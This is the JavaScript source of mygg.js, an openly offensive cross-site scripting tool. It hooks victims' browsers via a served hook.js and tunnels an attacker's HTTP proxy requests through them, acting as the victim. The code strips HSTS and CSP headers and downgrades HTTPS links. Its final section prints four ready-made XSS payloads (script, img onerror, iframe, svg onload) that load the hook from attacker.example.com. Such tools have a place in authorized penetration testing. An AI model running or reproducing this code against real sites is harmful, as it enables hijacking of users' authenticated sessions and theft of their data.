/* --------- Info --------- */

//  mygg.js v0.4.0
//  Author: Daniel Solstad (https://github.com/dsolstad/mygg.js)
//  Forked by: Daniel Antonsen (https://github.com/root4loot/mygg.js)

/* --------- Configuration --------- */

const config = {
    domain: process.env.DOMAIN || 'attacker.example.com',
    https_interface: '0.0.0.0',
    https_port: 8443,
    polling_time: 2000,
    key: './key.pem',
    cert: './cert.pem',
    debug: 0,
    proxy_interface: '0.0.0.0',
    proxy_port: 8081,
    proxy_allowed_ips: ['127.0.0.1'],
}

/* --------- Requires --------- */

const https = require('https');
const http = require('http');
const proxy = require('http');
const fs = require('fs');
const util = require('util');
const Busboy = require('busboy');
const { spawn } = require('child_process');

/* --------- Global variables --------- */

var tasks_pending = [];
var task_callbacks = {};
var task_counter = 0;

/* --------- The HTTP proxy server that the attacker uses --------- */

proxy.createServer(function (req, res) {
    /* Checks if the client is allowed. */
    var client_ipaddr = req.connection.remoteAddress;
    if (config.proxy_allowed_ips.indexOf(client_ipaddr) === -1) {
        console.log(`[+] Denied client ${client_ipaddr} to connect to proxy`);
        res.writeHead(403);
        res.end();
        return;
    }

    console.log(`[+] Whitelisted client ${client_ipaddr} connected to proxy`);
    console.log(`[+] Requesting: ${req.method} ${req.url}`);
    
    /* Check if request from proxy/attacker contains a body. */
    if (req.headers['content-length'] > 0) {
        var data = [];
        req.on('data', function (chunk) {
            data.push(chunk);
        });
        req.on('end', function () {
            /* Sends a task to the hooked browser. */
            var buffer = Buffer.concat(data);
            var body = buffer.toString('utf8');
            var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "headers": req.headers, "body": body}
            tasks_pending.push(new_task);
            
            /* Handles the response from the task given to the hooked browser. */
            task_callbacks[new_task.id] = function (result) {
                var headers = result.headers;
                var headers = str2json(headers);
                var headers = stripHeaders(headers);
                var content_type = (headers['content-type']? headers['content-type'] : 'plain/text');

                /* If the received content type is binary, we need to present it as such.
                   If is it text, we need to process it before being displayed in the attacking browser. */
                if (content_type.match(/image|octet-stream/)) {
                    var body = result.body;
                } else {
                    var body = result.body.toString('utf8');
                    var body = stripHooks(body);
                    var body = https2http(body);
                }

                var body_length = body.length;
                var headers = updateContentLength(headers, body_length);

                console.log("[+] Received status: " + result.status);
                if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
                if (config.debug) { console.log("[+] Received body:\n" + body); }
                console.log("[+] -------------------------------- [+]");

                // Need to convert status code to a valid one.
                if (result.status == '0') { 
                    res.writeHead(404);
                } else {
                    res.writeHead(result.status, headers);
                }
                res.end(body);
            };
        });
    } else {
        /* Sends a task to the hooked browser. */
        var new_task = {"id": task_counter++, "method": req.method, "url": req.url, "headers": req.headers, "body": null}
        tasks_pending.push(new_task);
    
        /* Handles the response from the task given to the hooked browser. */
        task_callbacks[new_task.id] = function (result) {
            var headers = result.headers;
            var headers = str2json(headers);
            var headers = stripHeaders(headers);
            var content_type = (headers['content-type']? headers['content-type'] : 'plain/text');

            /* If the received content type is binary, we need to present it as such.
               If is it text, we need to process it before being displayed in the attacking browser. */
            if (content_type.match(/image|octet-stream/)) {
                var body = result.body;
            } else {
                var body = result.body.toString('utf8');
                var body = stripHooks(body);
                var body = https2http(body);
            }

            var body_length = body.length;
            var headers = updateContentLength(headers, body_length);

            console.log("[+] Received status: " + result.status);
            if (config.debug) { console.log("[+] Received headers:\n"); console.log(headers); }
            if (config.debug) { console.log("[+] Received body:\n" + body); }
            console.log("[+] -------------------------------- [+]");

            // Need to convert status code to a valid one.
            if (result.status == '0') { 
                res.writeHead(404);
            } else {
                res.writeHead(result.status, headers);
            }
            res.end(body);
        };
    }

}).listen(config.proxy_port, config.proxy_interface, function (err) {
    if (err) return console.error(err)
    var info = this.address()
    console.log(`[+] Proxy server listening on address ${info.address} port ${info.port}`)
});


/* --------- HTTPS server for serving hook.js, polling and receiving requests --------- */

http_handler = function(req, res) {
    var ipaddr = req.connection.remoteAddress;
    var useragent = req.headers['user-agent'];
    var referer = req.headers['referer'];
    /* Serves the hook file */
    if (req.url == '/hook.js') {
        fs.readFile('hook.js', function(err, data) {
            if (err) {
                res.writeHead(404);
                res.end();
                return;
            }
            res.writeHead(200, {"Content-Type": "application/javascript"});
            res.end(data);
            console.log("[+] Hooked new browser [" + ipaddr + "][" + useragent + '][' + referer + ']');
        });
    /* Hooked browser asks mygg if there are any new jobs for it */
    } else if (req.url == '/polling') {
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.setHeader('Access-Control-Allow-Headers', '*');
        res.setHeader('Content-Type', 'application/json');

        if (tasks_pending.length > 0) {
            data = JSON.stringify(tasks_pending);
            if (config.debug) { 
                console.log("[+] Tasks pending"); console.log(data); 
                console.log("[+] -------------------------------- [+]");
            }
            res.writeHead(200);
            res.end(data);
            tasks_pending = []
        } else {
            res.writeHead(404)
            res.end();
        }
    /* Catching the performed requests from the hooked browser */
    } else if (req.url == '/responses' && req.method == 'POST') {

        var busboy = Busboy({ headers: req.headers });
        var response = {};

        busboy.on('file', function(fieldname, file, filename, encoding, mimetype) {
            response[fieldname] = [];
            //console.log('File [' + fieldname + ']: filename: ' + filename + ', encoding: ' + encoding + ', mimetype: ' + mimetype);
            file.on('data', function(data) {
                //console.log('File [' + fieldname + '] got ' + data.length + ' bytes');
                response[fieldname].push(data);
            });
            file.on('end', function() {
                //console.log('File [' + fieldname + '] Finished');
                response[fieldname] = Buffer.concat(response[fieldname]);
            });
        });
        busboy.on('field', function(fieldname, val, fieldnameTruncated, valTruncated, encoding, mimetype) {
            //console.log('Field [' + fieldname + ']: value: ' + util.inspect(val));
            response[fieldname] = val;
        });
        busboy.on('finish', function() {
            // Runs the callback for the associated request ID
            var handler = task_callbacks[response['id']];
            handler(response);
            res.writeHead(200, { Connection: 'close' });
            res.end();
        });

        req.pipe(busboy);

    } else {
        res.writeHead(404);
        res.end();
    }
};

/* Generate key and self-signed certificate. */
const shell = spawn('openssl', 'req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj /CN=localhost'.split(" "));

/* Read key and cert before starting HTTPS Server. */
shell.on('close', function (code) {
    https_options = { key: fs.readFileSync(config.key), cert: fs.readFileSync(config.cert) };
    https.createServer(https_options, http_handler).listen(config.https_port, config.https_interface, function(err) {
        if (err) return console.error(err)
        var info = this.address()
        console.log(`[+] HTTPS server listening on address ${info.address} port ${info.port}`)
    });
});


/* --------- Helper functions --------- */

/* Removes unwanted headers, such as HSTS and CSP. */
function stripHeaders(headers) {
    delete headers['strict-transport-security'];
    delete headers['content-security-policy'];
    delete headers['content-encoding'];
    delete headers['content-length'];
    return headers;
}

/* Strips complete URLs with hook.js to "javascript", which will be ignored. */
function stripHooks(body) {
    return body.replace(/src=["']https?:\/\/[^\/]*?\/hook\.js/g, "src='javascript:#");
}

/* Convert links in the body from https to http. */
function https2http(body) {
    return body.toString().replace(/https\:\/\//g, "http://");
}

/* Sets the content-length header. */
function updateContentLength(headers, new_length) {
    headers['Content-Length'] = new_length;
    return headers;
}

/* Converts a string to JSON. */
function str2json(headers) {
    var arr = headers.trim().split(/[\r\n]+/);
    var header_map = {};
    arr.forEach(function (line) {
        var parts = line.split(': ');
        var header = parts.shift().toLowerCase();
        var value = parts.join('');
        header_map[header] = value;
    });
    return header_map;
}

/* --------- Payload stager that downloads mygg --------- */

const payloads = [
    `<script>var x=document.createElement('script');x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);</script>`,
    `<img src=x onerror="var x=document.createElement('script');x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);">`,
    `<iframe src="javascript:var x=document.createElement('script');x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);"></iframe>`,
    `<svg/onload="var x=document.createElement('script');x.src='//${config.domain}:${config.https_port}/hook.js';document.head.appendChild(x);">`
];

console.log("[+] Payload stager examples:");
payloads.forEach((hook, index) => {
    console.log(`[+] Example payload ${index + 1}:`);
    console.log(hook + "\n");
});